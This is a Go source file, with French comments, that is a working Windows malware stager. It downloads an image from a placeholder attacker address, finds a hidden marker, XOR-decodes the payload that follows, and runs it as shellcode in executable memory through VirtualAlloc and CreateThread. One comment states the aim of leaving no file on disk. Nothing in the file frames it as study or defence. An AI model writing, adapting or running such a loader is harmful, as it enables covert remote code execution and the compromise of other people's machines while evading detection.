package main

import (
	"io"
	"net/http"
	"syscall"
	"unsafe"
)

func main() {
	// Télécharger l'image
	resp, err := http.Get("http://{IP}:8080/img.jpg")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	
	// Chercher le marqueur 0xAA 0xAA 0xAA
	offset := 0
	for i := 0; i < len(data)-3; i++ {
		if data[i] == 0xAA && data[i+1] == 0xAA && data[i+2] == 0xAA {
			offset = i + 3
			break
		}
	}
	
	if offset == 0 || offset >= len(data) {
		return
	}
	
	// Extraire et déchiffrer
	encrypted := data[offset:]
	for i := 0; i < len(encrypted); i++ {
		encrypted[i] ^= 0xAA
	}
	
	// Exécuter en mémoire (pas de fichier sur le disque)
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(encrypted)), 0x3000, 0x40)
	if addr == 0 {
		return
	}
	
	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&encrypted[0])), uintptr(len(encrypted)))
	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
	if thread != 0 {
		waitForSingleObject.Call(thread, 0xFFFFFFFF)
	}
}